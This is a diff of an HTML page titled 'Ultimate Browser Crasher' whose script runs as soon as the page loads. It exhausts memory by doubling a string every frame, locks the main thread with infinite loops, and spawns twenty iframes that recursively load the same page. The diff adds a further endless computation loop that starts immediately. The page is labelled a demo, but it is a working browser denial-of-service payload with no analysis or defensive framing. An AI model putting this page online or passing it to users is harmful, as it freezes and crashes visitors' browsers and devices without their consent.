@@ -1,37 +1,53 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <title>Ultimate Crash Test</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ultimate Browser Crasher</title>
 </head>
 <body>
-  <h1>💥 Ultimate Crash Demo</h1>
-  <p>If you can still read this, the script hasn’t locked yet.</p>
+    <h1>💥 Ultimate Browser Crash Demo</h1>
+    <p>If your browser is still responsive, the crash hasn’t triggered yet.</p>
 
-  <script>
-    // --- MEMORY HOG ---
-    const junk = [];
-    let s = "x".repeat(1024 * 1024); // 1 MB seed
+    <script>
+        // --- MEMORY HOG ---
+        const junk = [];
+        let s = "x".repeat(1024 * 1024); // 1 MB seed
 
-    (function hog() {
-      s = s + s;              // doubles each time
-      junk.push(s.slice());   // keep it in memory
-      requestAnimationFrame(hog);
-    })();
+        (function hog() {
+            s = s + s;               // doubles each time
+            junk.push(s.slice());    // keep it in memory
+            requestAnimationFrame(hog);
+        })();
 
-    // --- CPU FREEZE ---
-    setTimeout(() => {
-      while (true) {} // locks main thread
-    }, 2000); // starts after 2 sec
+        // --- CPU FREEZE (original infinite loop) ---
+        setTimeout(() => {
+            while (true) {} // locks main thread
+        }, 2000); // starts after 2 sec
 
-    // --- IFRAME RECURSION ---
-    setTimeout(() => {
-      for (let i = 0; i < 20; i++) {
-        const iframe = document.createElement("iframe");
-        iframe.src = location.href; // reloads this same page inside
-        document.body.appendChild(iframe);
-      }
-    }, 1000); // spawn frames before CPU lock
-  </script>
+        // --- RECURSIVE IFRAMES ---
+        setTimeout(() => {
+            for (let i = 0; i < 20; i++) {
+                const iframe = document.createElement("iframe");
+                iframe.src = location.href; // reloads this page inside itself
+                document.body.appendChild(iframe);
+            }
+        }, 1000); // spawn frames before CPU lock
+
+        // --- NEW HEAVY COMPUTATION LOOP ---
+        function crashBrowser() {
+            try {
+                while (true) {
+                    for (let i = 0; i < 1000000; i++) {
+                        Math.random();
+                    }
+                }
+            } catch (e) {
+                crashBrowser();
+            }
+        }
+
+        crashBrowser(); // starts immediately
+    </script>
 </body>
 </html>
